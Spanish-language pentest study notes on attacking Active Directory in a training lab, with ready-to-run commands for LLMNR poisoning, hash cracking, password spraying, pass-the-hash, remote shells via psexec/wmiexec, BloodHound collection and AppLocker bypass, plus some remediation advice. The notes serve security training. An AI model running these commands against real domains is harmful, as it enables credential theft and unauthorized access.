### Active Directory

**Herramientas**

- [d3ad0ne](https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) 
- [kerbrute](https://github.com/ropnop/kerbrute)
- [Usernames Estadisticamente Probables](https://github.com/insidetrust/statistically-likely-usernames)
- [linkedin2username](https://github.com/initstring/linkedin2username)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) / [SharpView](https://github.com/dmchell/SharpView) - PowerShell y .NET para reconocimiento en AD, alternativa a comandos net*.
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Mapea relaciones de AD para planear rutas de ataque, usa Neo4j para análisis gráfico.
- [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) - Colector en C# para obtener información de AD (usuarios, grupos, ACLs, GPOs, etc.).
- [BloodHound.py](https://github.com/fox-it/BloodHound.py) - Ingestor en Python basado en Impacket para recolectar datos de AD.
- [Kerbrute](https://github.com/ropnop/kerbrute) - Enumeración de cuentas AD y ataques de password spraying/bruteforce vía Kerberos.
- [Impacket toolkit](https://github.com/SecureAuthCorp/impacket) - Colección de scripts en Python para interactuar y atacar protocolos de red.
- [Responder](https://github.com/lgandx/Responder) - Envenenamiento LLMNR, NBT-NS y MDNS.
- [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) - Herramienta PowerShell para spoofing y envenenamiento de red.
- [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) - Versión en C# de Inveigh con consola interactiva.
- [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo) - Consulta servicios RPC disponibles en un host.
- [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) - Cliente de RPC en Linux (parte de Samba) para tareas de enumeración AD.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Toolkit para enumeración, ataques y post-explotación en AD.
- [Rubeus](https://github.com/GhostPack/Rubeus) - Herramienta en C# para abuso de Kerberos.
- [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) - Script de Impacket para encontrar SPNs de usuarios normales.
- [Hashcat](https://hashcat.net/hashcat/) - Crackeo de hashes y recuperación de contraseñas.
- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) - Enumeración de Windows y Samba.
- [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) - Reimplementación de enum4linux.
- [ldapsearch](https://linux.die.net/man/1/ldapsearch) - Cliente integrado para interactuar con LDAP.
- [windapsearch](https://github.com/ropnop/windapsearch) - Script Python para consultas LDAP en AD.
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) - Password spraying en PowerShell contra usuarios de dominio.
- [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) - Funciones PowerShell para auditar/atacar LAPS en AD.
- [smbmap](https://github.com/ShawnDEvans/smbmap) - Enumeración de shares SMB en dominios.
- [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Impacket: shell semi-interactiva tipo Psexec.
- [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) - Impacket: ejecución de comandos vía WMI.
- [Snaffler](https://github.com/SnaffCon/Snaffler) - Busca credenciales u otros datos sensibles en shares accesibles.
- [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) - Servidor SMB simple para transferir archivos.
- [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) - Gestiona SPNs de cuentas de servicio en AD.
- [Mimikatz](https://github.com/ParrotSec/mimikatz) - Extracción de credenciales, tickets Kerberos, pass-the-hash, etc.
- [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) - Impacket: volcado remoto de SAM y LSA.
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) - Shell interactiva sobre WinRM.
- [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) - Cliente MSSQL de Impacket.
- [noPac](https://github.com/Ridter/noPac) - Exploit de CVE-2021-42278 y CVE-2021-42287 para escalar a DA.
- [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) - Impacket: mapea endpoints RPC.
- [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) - PoC de PrintNightmare en Python.
- [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) - Impacket: ataques de relay SMB.
- [PetitPotam](https://github.com/topotam/PetitPotam) - PoC CVE-2021-36942 para coerción de autenticación.
- [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) - Manipulación de certificados y TGTs.
- [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) - Obtención de PACs mediante U2U.
- [adidnsdump](https://github.com/dirkjanm/adidnsdump) - Enumeración/dump de registros DNS en AD.
- [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) - Extrae credenciales de archivos de GPP.
- [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) - Impacket: ataque ASREPRoasting para obtener hashes AS-REP.
- [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) - Fuerza bruta de SIDs.
- [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) - Creación de tickets Kerberos (Golden Ticket, child-to-parent, etc.).
- [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) - Impacket: escalada de privilegios child-to-parent domain.
- [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) - Visualizador/editor de AD, permite snapshots para análisis offline.
- [PingCastle](https://www.pingcastle.com/documentation/) - Auditoría de seguridad AD con enfoque de riesgo/madurez.
- [Group3r](https://github.com/Group3r/Group3r) - Auditoría y búsqueda de malas configuraciones en GPOs.
- [ADRecon](https://github.com/adrecon/ADRecon) - Recolector de datos AD con exportación en Excel para análisis.


__________________________________

### Enumeración Inicial

```
# Visualizar y Capturar Actividad en la Red
sudo -E wireshark
sudo tcpdump -i ens224
sudo responder -I ens224 -A 

# Enumeración de la Red
fping -asgq 172.16.5.0/23 (a objetivos vivos, s imprimir estadisticas, g generar lista de objetivos CIDR, q mostrar todos los resultados)
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum



```

### Identificación de Host/Red

```
# Escuchar la red (Puede ser util filtrando por protocolos ej:ARP - Saber que host estan activos (Anotarlos))

sudo -E wireshark  -Iniciar Wireshark

sudo tcpdump -i ens224  -Escuchar la red con tcpdump

sudo responder -I ens224 -A  -Ver flujo de sesiones (Sin envenenar)

# Barrido de ping (Descubrimiento de Host por Protocolo ICMP)

fping -asgq 172.16.5.0/23
  -a Hosts vivos
  -s Mostrar estadisticas
  -g Generar lista de objetivos a partir de la red CIDR
  -q No mostrar resultados por objetivo

nmap -sn <IP>

# Identificación de servicios en Hosts

sudo nmap -v -A -iL hosts.txt -oN host-enum.nmap -Escanep agresivo a lista de IPs
```

### Identificaión de Usuarios (Interno)

```
# Kerbrute - Enumeración interna de nombres de usuario de AD

--------------
Install GO

 go install github.com/ropnop/kerbrute@latest

--------------
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make all
sudo cp dist/kerbrute_linux_amd64 /usr/local/bin/kerbrute
sudo chmod +x /usr/local/bin/kerbrute
kerbrute --help

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
kerbrute_linux_amd64 passwordspray --dc 3.149.246.12 -d spartancybersec.corp ./users.txt Password@1  -Password Spraying

```

### Identificación de Posibles Vulnerabildiades

```
MS08-067, EternalBlue, or BlueKeep
SeImpersonate con JuiciPotatoe
Psexec
BloodHound
PowerView
Kerberoasting / ASREPRoasting
Inveigh to gather Net-NTLMv2
SMB relay
ACL attacks
```
__________________________________________________________________________

> LLMNR y NBT-NS son protocolos de resolución de nombres que Windows utiliza cuando falla el DNS. El problema es que cualquier equipo en la red puede responder a estas solicitudes, lo que permite ataques de tipo Man-in-the-Middle. Un atacante puede aprovechar esta vulnerabilidad para suplantar identidades de red, capturar hashes de contraseñas (NetNTLM) y, en algunos casos, obtener credenciales en texto claro o realizar ataques SMB Relay para acceso no autorizado.

### LLMNR/NBT-NS Poisoning - from Linux

```
#RESPONDER
Responder se debe ejecutar con privilegios de root e idealmente tener nuestro host habilitado estos puertos "UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353"

sudo responder -I ens224 #Inicia Responder en una interfaz de red
```
### Descifrar Hash NTLMv2 con HashCat (Capturado con Responder)
```
hashcat -m 5600 forend_ntlmv2.txt /usr/share/wordlists/rockyou.txt
```
### LLMNR/NBT-NS Poisoning - from Windows
> En Mitre ATT&CK esta tecnica se identifica como **T1557.001** _Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay_

```
#Inveigh
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y #Suplantacion de LLMNR y NBNS, ingreso a consola y la salida va a un archivo

Tambien hay una version en C la cual es mas estable y actualizada, pero se debe compilar primero en VisualStudio

PS C:\htb> .\Inveigh.exe #Este nos permite consultar durante la ejecucuion
    "ESC" > GET NTLMV2UNIQUE #Para ver los hashes unicos capturados o cualquier otro con > HELP (GET NTLMV2USERNAMES, )
```
**RECOMENDACIONES PARA EL CLIENTE**

Desabilitar LLMNR y NBT-NS `We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."`, pero aclarandole al cliente que debe tener precaucion y verificar que estos cambios no afecten al sistema
Para NBT-NS no se puede desactivar a través de la Política de grupo, pero debe desactivarse localmente en cada host
Monitorear los puertos UDP 5355 y 137, y los ID de eventos 4697 y 7045 ya que están asociados a LLMNR y NBT-NS respectivamente


________________________________________________________________

## Password Spraying

> Password spraying es una técnica que consiste en probar una o pocas contraseñas comunes contra una gran cantidad de usuarios, evitando así los bloqueos automáticos por intentos fallidos. A diferencia de un ataque de fuerza bruta tradicional, es más sigiloso y efectivo, especialmente en redes internas, y puede permitir obtener acceso inicial a sistemas. Sin embargo, aún existe riesgo de bloqueo de cuentas, por lo que debe ejecutarse con retrasos entre intentos y teniendo en cuenta la política de contraseñas del dominio.

> Para esto primero se deben tener nombres de cuentas por lo cual se puede usar una lista de [Usuarios estadisticamente probables](https://github.com/insidetrust/statistically-likely-usernames) y se puede combinar con enumeracion OSINT ej: Usuarios obtenidos de Linkedin y probandolos con la herramienta de **Kerbrute**. Para obtener privilegios administrativos o los suficientes para poder hacer enumeracion con BloodHound

### Enumerating & Retrieving Password Policies
#### Enumerating the Password Policy - from Linux - Credentialed

> Antes de hacer un Password Spraying es recomendable conocer la politica de contraseñas, ya que en caso de que a cierta cantidad de intentos se bloqueen las cuentas y solo las pueda desbloquear un administrador manualmente, estariamos generando una gran indisponibilidad al cliente. Igual si el tiempo de bloqueo es muy largo

```
#Averiguar politica de contraseñas con Crackmapexec o Netexec -Con credenciales
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Enumerar politica de contraseñas con SMB con una Null Session
rpcclient -U "" -N 172.16.5.5
    > querydominfo #Sirve para verificar el acceso a una Null Session, ademas de enumerar algo de la Politica de Contraseñas

enum4linux -P 172.16.5.5 # Enumerar informacion sobre politicas
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

#### Enumerating Null Session - from Windows
Confirmar sesiones nulas desde windows
```PowerShell
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.
```

#### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

#### Enumerating the Password Policy - from Windows
> La politica de contraseñas se podria obtener igualemnte a traves de PowerView, CrackMapExec portado a Windows, SharpMapExec, SharpView, etc. Unicamente si el cliente permite el acceso a internet o a estas herramientas. Si no:
```
C:\htb> net accounts

PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```

### Password Spraying - Making a Target User List

```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" #Filtrado de unicamente cuentas de usuario

rpcclient -U "" -N 172.16.5.5
    > enumdomusers

crackmapexec smb 172.16.5.5 --users #Enumera usuarios e indica Intentos de inicio de sesion (badpwdcount ) y la fecha del ultimo intento (baddpwdtime) 
```

#### Gathering Users with LDAP Anonymous
> Se puede hacer enumeracion de cuentas de usuario con Windapsearch o LDAPSearch si se tiene un acceso anonimo a LDAP
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" " #Comando de enumeracion con filtrado unicamente de usuarios

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U #U Filtra por usuarios. Aunque es ideal conocer las filtros de busqueda de LDAP

```

#### Enumerating Users with Kerbrute
> Kerbrute permite enumerar usuarios válidos en Active Directory aprovechando la preautenticación de Kerberos. Si un usuario es válido, el KDC (controlador de dominio) pedirá autenticación previa; si no lo es, responderá con “PRINCIPAL UNKNOWN”. Esta técnica no genera eventos de error visibles (como el 4625) ni bloquea cuentas, lo que la hace rápida y sigilosa. Sin embargo, si se usa para password spraying, los intentos fallidos sí pueden causar bloqueos, por lo que debe usarse con precaución.

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt #Enumeracion de usuarios con la lista de Usuarios estadisticamente Probables

```

#### Credentialed Enumeration to Build our User List

```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

```
__________________________________________________________________________

## Spray Responsibly

### Internal Password Spraying from a Linux Host
**Internal Password Spraying from a Linux Host**

```bash
# Se usa rpcclient y se prueban todos los usuarios con una contrasñea y se filtra por el acceso valido "Authority Name"
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Esto mismo se puede realizar con Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

# Igualmente con Crackmapexec ya que este recibe una lista como usuario o contraseña
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Luego con este mismo se validan las credenciales capturadas
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

```

### Local Administrator Password Reuse
> La reutilización de contraseñas de administrador local es común en redes corporativas y representa un riesgo elevado. Si un atacante obtiene el hash o contraseña de una cuenta local privilegiada, puede usar herramientas como CrackMapExec para intentar ese mismo acceso en múltiples hosts, ya que muchos comparten la misma contraseña. Esta técnica permite obtener acceso administrativo en varios sistemas. Aunque es efectiva, es ruidosa y no recomendada en evaluaciones que requieran sigilo. La solución recomendada es implementar LAPS, que asigna contraseñas locales únicas y rotativas desde Active Directory.

```
Suponiendo que unicamente se pudo obtener el Hash NTLM del SAM Local, se hace una autenticacion en todos los host disponibles en busca de otro host con reutilizacion de credenciales. Cabe resaltar que es una tecnica Ruidosa

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
      --local-auth # Indica a la herramienta que solo debe autenticarse una vez en cada maquina
```

**RECOMENDACIONES CLIENTE**

Una forma de solucionar este problema es utilizar la herramienta gratuita de Microsoft Solución de contraseña de administrador local (LAPS) hacer que Active Directory administre las contraseñas de los administradores locales y aplique una contraseña única en cada host que gire en un intervalo establecido.


**Internal Password Spraying - from Windows**

Herramienta que extrae la lista de todos los usuarios del dominio: [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray), en esta se debe estar autenticado o estar en un dispositivo fisico

```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
Desde un host Windows unido a un dominio, es posible realizar pulverización de contraseñas usando herramientas como DomainPasswordSpray.ps1, que permite probar una contraseña contra muchos usuarios de AD respetando la política de bloqueo. Esta técnica es útil para obtener credenciales sin causar bloqueos.

Mitigaciones clave:

- MFA, restricción de acceso, buenas prácticas de contraseñas, segmentación de red.

- Detección: monitoreo de eventos 4625 y 4771 en los controladores de dominio.

____________________________________________________________________________-
## Deeper Down the Rabbit Hole

### Enumerating Security Controls

#### 1. Objetivo
Tras obtener acceso inicial, se enumeran controles de seguridad en el dominio para:
- Evaluar defensas activas.
- Adaptar herramientas y técnicas de post-explotación.
- Identificar posibles rutas de evasión.

#### 2. Windows Defender
- Herramienta usada: `Get-MpComputerStatus`
- Protección en tiempo real: `RealTimeProtectionEnabled = True`
- Bloquea herramientas comunes como PowerView.

#### 3. AppLocker
- Controla qué apps pueden ejecutarse.
- Cmd y PowerShell a menudo están bloqueados.
- Bypasses comunes: usar otras rutas como:
  - `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`

- **Comando útil:** `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

#### 4. PowerShell Constrained Language Mode
- Modo restringido limita capacidades como COM, .NET, clases, etc.
- Comando de verificación: `$ExecutionContext.SessionState.LanguageMode`
- Ejemplo de salida: `ConstrainedLanguage`

#### 5. LAPS (Local Administrator Password Solution)
- Administra contraseñas locales únicas por host.
- Objetivo del atacante: encontrar usuarios que puedan leer contraseñas.

#### Herramientas útiles:
- `Find-LAPSDelegatedGroups` → muestra grupos con permisos LAPS.
- `Find-AdmPwdExtendedRights` → identifica usuarios con "All Extended Rights".
- `Get-LAPSComputers` → muestra equipos con LAPS, expiración y contraseñas (si hay acceso).


## Credentialed Enumeration - from Linux

Usando crackmapexec o netexec (que es una herramienta que integra funciones de Impacket y de PoweSploit) podemos hacer una enumeracion de usuarios si tenemos una cuenta de usuario valida, este ataque va dirigido al Controlador de Dominio, ya que este es el que contiene toda la información de los usuarios y demas.

**CrackMapExec**
```
#Enumeracion de usuarios e informacion de politicas de contraseña
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
  SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
------------------------------------------------------------------

#Enumeracion de grupos de dominio
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
------------------------------------------------------------------

#Enumeracion de usuarios conectados
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
  SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
------------------------------------------------------------------

#Enumerar permisos en recursos compartidos
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
  SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share
------------------------------------------------------------------

#Uso de Spider-plus para explotar todos los recursos accesibles (Explorará cada recurso compartido legible en el host y enumerará todos los archivos legibles)
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
  SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus

```
**SMBMap**
Se utiliza para recopilar una lista de recursos compartidos, permisos y contenidos compartidos. Una vez obtenido el acceso, se puede utilizar para descargar y cargar archivos y ejecutar **comandos remotos**. Además de enumerar acciones, podemos usar SMBMap para enumerar directorios de forma recursiva, enumerar el contenido de un directorio, buscar el contenido de archivos y más. 
```
#Mapeo y comprobacion de acceso inicial
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
---------------------------------------

#Enumeracion recursiva de sub/directorios
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

**RPCClient**
Es una herramienta útil creada para usarse con el protocolo Samba y para brindar funcionalidad adicional a través de MS-RPC. Puede enumerar, agregar, cambiar e incluso eliminar objetos de AD.



```
#Acceso no autenticado a rpcclient
rpcclient -U "" -N 172.16.5.5
```
En una enumeración con rpcclient, los RIDs (identificadores relativos) permiten identificar de forma única a los objetos dentro de un dominio al combinarse con el SID del dominio. Esto es útil para la enumeracion porque algunos RIDs son estáticos y predecibles, como el RID 500 para la cuenta de Administrador, lo que permite enumerar usuarios clave y obtener información sensible del dominio, incluso sin conocer previamente sus nombres. Esta técnica es esencial para identificar objetivos valiosos dentro de un entorno Active Directory.

```
#Enumeracion de usuarios por RID
rpcclient $> queryuser 0x457

#Enumerar todos los usuarios del dominio
rpcclient $> enumdomusers
```

#### Impacket Toolkit
Impacket es un conjunto de herramientas versátil que nos proporciona muchas formas diferentes de enumerar, interactuar y explotar los protocolos de Windows y encontrar la información que necesitamos usando Python. La herramienta se mantiene activamente y tiene muchos contribuyentes, especialmente cuando surgen nuevas técnicas de ataque. 

**Psexec.py**
psexec.py es una herramienta de Impacket que permite ejecutar comandos de forma remota como NT AUTHORITY\SYSTEM en un host Windows, utilizando credenciales válidas. A diferencia del PsExec original, esta versión sube un ejecutable aleatorio al recurso compartido ADMIN$, crea un servicio remoto a través de RPC, y luego se comunica mediante un named pipe, ofreciendo una shell interactiva como SYSTEM. Es útil para moverse lateralmente dentro de un entorno Windows tras obtener credenciales válidas.
```
#Generar shell con credenciales de administrador local (whoami --> Authority\System)
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

**wmiexec.py**
wmiexec.py es una herramienta de Impacket que permite ejecutar comandos en un host Windows de forma remota y sigilosa, utilizando WMI (Windows Management Instrumentation). A diferencia de psexec.py, no sube archivos ni crea servicios, lo que reduce el rastro que deja en el sistema. El shell es semiinteractivo, ejecutando un nuevo cmd.exe por cada comando, y se ejecuta con el contexto del usuario autenticado, no como SYSTEM. Es útil para evadir detección básica, aunque puede generar eventos 4688 por cada ejecución. Ideal para movimientos laterales más discretos tras obtener credenciales válidas.

```
#Generar shell semi interactiva
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 
```
**Windapsearch**
Script útil de Python que podemos usar para enumerar usuarios, grupos y computadoras de un dominio de Windows mediante consultas LDAP
```

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

--da (enumerar a los miembros del grupo de administradores de dominio)
-PU (encontrar usuarios con privilegios excesivos por grupo anidado/memebership) 
```
**Bloodhound.py**

BloodHound.py es un ingestor de BloodHound escrito en Python que permite recolectar datos de Active Directory desde un host Linux, usando credenciales válidas de dominio. Es ideal cuando no se tiene acceso a un host Windows para ejecutar el colector SharpHound. Recoge información crítica como usuarios, grupos, ACLs, sesiones, permisos de RDP/WinRM, etc., y genera archivos JSON que se cargan en la interfaz gráfica de BloodHound para identificar rutas de ataque y relaciones entre objetos del dominio. Es una herramienta esencial para pentesters, ya que automatiza y visualiza caminos complejos de escalada de privilegios y movimientos laterales.

Un recurso util son las [Consultas personalizadas de Cypher](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

```
#Ejecutar bloodhound con "all" para recuperar la mayor cantidad de datos posibles en formato json
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
zip -r ilfreight_bh.zip *.json

#Instalar BloodHound [Kali](https://www.kali.org/tools/bloodhound/) 
sudo apt install -y bloodhound
sudo bloodhound-setup (sudo neo4j start)
  username: neo4j
  password: neo4j
bloodhound

zip -r ilfreight_bh.zip *.json #Se comprimen todos los archivos json encontrados anteriormente
  Upload Data #Seleccionar la opcion y cargar el .zip

#Iniciar Bloodhound
sudo neo4j start
sudo bloodhound
```

## Credentialed Enumeration - from Windows

En la enumeración con credenciales desde Windows, se utilizan herramientas como SharpHound, PowerView, Grouper2 y Snaffler para identificar configuraciones inseguras, relaciones entre objetos del dominio, accesos a shares y posibles vectores de movimiento lateral/vertical. Estos hallazgos pueden ser usados tanto para ataques como para informes, destacando problemas de visibilidad, privilegios excesivos, trusts entre dominios o exposición de datos sensibles como credenciales. Es útil también documentar hallazgos informativos que puedan ayudar al cliente a mejorar su postura de seguridad, incluso si no conducen directamente a una explotación.

### ActiveDirectory PowerShell Module

El módulo de ActiveDirectory para PowerShell incluye más de 140 cmdlets útiles para administrar y enumerar entornos AD desde la línea de comandos. Antes de usarlo, se debe verificar e importar con Get-Module e Import-Module ActiveDirectory. Es ideal para descubrir información del dominio, usuarios, grupos y configuraciones, y puede combinarse de múltiples formas para una enumeración más eficaz durante una auditoría o pentest.

```PowerShell
#Cargar modulo
Import-Module ActiveDirectory

#Ver modulos disponibles
Get-Module

#Obtener informacion del dominio
Get-ADDomain

#Cuentas suceptibles a Kerberoasting usando cmdlets
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

#Relaciones de confianza del dominio (Investigar)
Get-ADTrust -Filter *

#Enumeracion de grupos
Get-ADGroup -Filter * | select name

#Informacion detallada de un grupo especifico
Get-ADGroup -Identity "Backup Operators"

#Obtener miembros de grupo
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView

Al igual que BloodHound, proporciona una forma de identificar dónde están conectados los usuarios en una red, enumerar información de dominio como usuarios, computadoras, grupos, ACLS, fideicomisos, buscar archivos compartidos y contraseñas, realizar Kerberoasting y más.
> Verificar todas las posibles consultas con PowerView
```
#Obtener informacion del usuario (mmorgan) del dominio
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

#Enumeracion de grupos recursivamente
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

#Enumerar asignaciones de confianza
Get-DomainTrustMapping

#Prueba de acceso del usuario administrador local actual
Test-AdminAccess -ComputerName ACADEMY-EA-MS01  #Purba si la cuenta es un administrador en ACADEMY...

#Busqueda de usuarios vulnerables a Kerberoasting (con SPN Establecido)
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView

SharpView es una versión en .NET de PowerView que permite realizar funciones similares, útil en entornos donde PowerShell está restringido.

```
#Enumerar informacion especifica de un usuario
.\SharpView.exe Get-DomainUser -Identity forend
```

**Shares**
Las carpetas compartidas en un dominio permiten a los usuarios acceder y compartir información según su rol, pero una configuración permisiva puede exponer datos sensibles como archivos de configuración, claves SSH o contraseñas mal almacenadas. Acceder a shares con información de infraestructura desde una cuenta de usuario estándar comprometida puede facilitar la escalada de privilegios o el movimiento lateral.

**Snaffler**
Snaffler automatiza la búsqueda de datos sensibles en entornos Active Directory al enumerar hosts del dominio, identificar sus shares accesibles y buscar archivos útiles para el atacante dentro de los directorios legibles. Opera bajo el contexto de un usuario del dominio y mejora significativamente la eficiencia frente a la revisión manual, permitiendo detectar información crítica con mayor rapidez y precisión.

```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

#### BloodHound

Para hacer la enumeracion con SharpHound.exe este ejecutable debe ser ejecutada en la maquina victima, la cual debe estar unida al dominio. Este se puede transferir de diferentes formas, entre ellas a traves de la creacion de un servicio web tipo con Ngrok. Pero pueden haber otras formas que se podrian explotar

```
#Ejecutar SharpHound desde el host de ataque (dentro del dominio)
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

## Living Off the Land

Es decir hacer una enumeracion dentro de un host el cual no tiene acceso a internet o acceso a las herramientas vistas anteriormente para recopilacion de informacion, por lo cual se realiza con las propias herramientas de Windows en este caso

### Env Commands For Host & Network Recon
Comandos básicos de enumeración

| Comando | Resultado |
|---------|-----------|
| `hostname` | Imprime el nombre de la PC |
| `[System.Environment]::OSVersion.Version` | Imprime la versión del sistema operativo y el nivel de revisión |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Imprime los parches y correcciones aplicadas al host |
| `ipconfig /all` | Imprime el estado y las configuraciones del adaptador de red |
| `set` | Muestra una lista de variables de entorno para la sesión actual (ejecutada desde CMD-prompt) |
| `echo %USERDOMAIN%` | Muestra el nombre de dominio al que pertenece el host (ejecutado desde CMD-prompt) |
| `echo %logonserver%` | Imprime el nombre del controlador de dominio con el que se registra el host (ejecutado desde CMD-prompt) |

**systeminfo**: Imprime un resumen de la información del host para nosotros en una salida ordenada

### Harnessing PowerShell (Aprovechamiento de Powershell)

Cmdlets de PowerShell para enumeración y ejecución

| Cmd-Let | Descripción |
|---------|-------------|
| `Get-Module` | Enumera los módulos disponibles cargados para su uso. |
| `Get-ExecutionPolicy -List` | Imprime la política de ejecución configurada para cada ámbito en un host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | Cambia la política de ejecución solo para el proceso actual. No es permanente, ideal para evitar cambios persistentes en el host víctima. |
